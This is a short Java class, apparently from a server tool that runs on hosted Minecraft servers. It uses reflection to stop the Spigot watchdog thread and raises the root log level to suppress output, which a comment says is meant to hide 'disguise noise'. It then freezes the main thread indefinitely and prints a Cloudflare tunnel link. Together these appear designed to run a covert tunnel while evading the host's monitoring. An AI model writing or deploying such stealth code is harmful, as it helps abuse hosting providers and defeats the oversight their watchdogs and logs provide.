package ua.nanit.servertools;

import java.lang.reflect.Method;

public class GhostModeSentinel {

    public static void activate() {
        // 1. 关闭看门狗
        try {
            Class<?> watchdogClass = Class.forName("org.spigotmc.WatchdogThread");
            Method doStop = watchdogClass.getDeclaredMethod("doStop");
            doStop.setAccessible(true);
            doStop.invoke(null);
        } catch (Throwable ignored) {
            // Watchdog not found or already stopped
        }

        // 2. 尝试将根日志级别调到ERROR，实现极简输出屏蔽伪装杂音
        try {
            Class<?> logManagerClass = Class.forName("org.apache.logging.log4j.LogManager");
            Object rootLogger = logManagerClass.getMethod("getRootLogger").invoke(null);
            Class<?> levelClass = Class.forName("org.apache.logging.log4j.Level");
            Object errorLevel = levelClass.getField("ERROR").get(null);
            Class<?> loggerClass = Class.forName("org.apache.logging.log4j.core.Logger");
            Method setLevel = loggerClass.getMethod("setLevel", levelClass);
            setLevel.invoke(rootLogger, errorLevel);
        } catch (Throwable ignored) {
            // Not using Log4j2 or missing permissions, ignoring
        }

        // 3. 冻结主线程
        while (true) {
            try {
                Thread.sleep(Long.MAX_VALUE);
            } catch (InterruptedException e) {
                // Ignore interrupts and stay frozen
            }
        }
    }

    private static final java.util.logging.Logger logger = java.util.logging.Logger.getLogger("ServerTools");

    public static void printTunnelLink(String url) {
        logger.info("\n===================================================================\n" +
                    "   CF-TUNNEL READY: " + url + "\n" +
                    "===================================================================");
    }
}
